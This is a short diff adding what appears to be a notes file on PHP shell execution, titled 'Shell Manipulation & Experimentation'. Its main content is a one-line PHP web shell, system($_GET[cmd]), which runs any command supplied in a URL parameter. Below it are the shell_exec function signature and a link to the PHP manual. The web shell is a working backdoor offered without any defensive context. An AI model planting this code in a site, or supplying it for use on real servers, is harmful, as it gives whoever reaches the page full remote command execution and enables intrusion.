@@ -1,0 +1,23 @@
+-----------------------------
+<?php
+
+system($_GET[cmd]);
+
+?>
+-----------------------------
+
+
+
+
+-----------------------------
+(PHP 4, PHP 5, PHP 7)
+string shell_exec ( string $cmd )
+-----------------------------
+
+
+
+
+
+Shell Manipulation & Experimentation:
+
+http://php.net/manual/en/function.shell-exec.php
